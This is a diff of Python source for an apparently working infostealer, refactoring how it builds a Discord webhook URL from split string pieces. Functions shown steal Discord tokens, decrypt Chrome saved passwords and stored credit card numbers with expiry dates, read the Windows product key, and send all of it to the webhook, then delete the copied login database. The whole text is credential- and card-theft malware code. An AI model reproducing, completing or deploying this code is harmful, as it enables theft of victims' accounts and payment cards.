@@ -34,26 +34,20 @@ from shutil import copyfile
 from PIL import ImageGrab
 from sys import argv
 
-
-http = "https"
-disc = "discord"
-webh = "webhooks"
-appl = "api"
-
-
 # THIS IS YOUR WEBHOOK PORTION, REPLACE HERE :
 # BELOW IS AN EXAMPLE OF WHAT YOUR WEBHOOK-ID, AND WEBHOOK-TOKEN IS
 #                      V "webhID"   V "webhAT"
 # discord/api/webhooks/000000000000/token
 webhID = "webhook-id"
 webhAT = "webhook-token"
-#
+# 
 
-# DON'T CHANGE THIS PORTION : REPLACE VARIABLES ABOVE
+http = "https"
+disc = "discord"
+webh = "webhooks"
+appl = "api"
 server = f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"
-winkey = Webhook(f'{server}')
 hook = Webhook(f"{server}")
-whURL = f'{server}'
 
 
 def sniff(path):
@@ -111,7 +105,7 @@ def tokensteal():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(whURL, data=payload.encode(), headers=headers)
+        req = Request(server, data=payload.encode(), headers=headers)
         urlopen(req)
     except:
         pass
@@ -182,6 +176,7 @@ class chromepassword:
     def __init__(self):
         self.passwordList = []
 
+
     def chromedb(self):
         _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
         _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
@@ -204,6 +199,7 @@ class chromepassword:
         conn.close()
         os.remove(db_file)
 
+
     def cdecrypt(self, encrypted_txt):
         if sys.platform == 'win32':
             try:
@@ -217,6 +213,7 @@ class chromepassword:
                 return None
         else:
             pass
+
 
     def saved(self):
         with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
@@ -313,10 +310,8 @@ def creditsteal():
             expire_year = r[3]
             hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
-
     except:
         pass
-
     cursor.close()
     conn.close()
     try:
@@ -381,7 +376,6 @@ def creditsteals():
                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
     except:
         pass
-
     cursor.close()
     conn.close()
     try:
@@ -390,7 +384,7 @@ def creditsteals():
         pass
 
 
-# WINDOW'S ACTIVATION KEY :
+# WINDOW'S PRODUCT KEY :
 def windows():
     try:
         usr = os.getenv("UserName")
@@ -409,7 +403,7 @@ def windows():
             description=f'user : {usr}\ntype : {types}\nkey : {keys}',
             color=0x2f3136
         )
-        winkey.send(embed=embed)
+        hook.send(embed=embed)
 
     except:
         pass
@@ -423,7 +417,7 @@ def gotcha():
         creditsteals()
         windows()
         try:
-            os.remove("Loginvault.db")
+            subprocess.os.system('del Loginvault.db')
         except:
             pass
         break
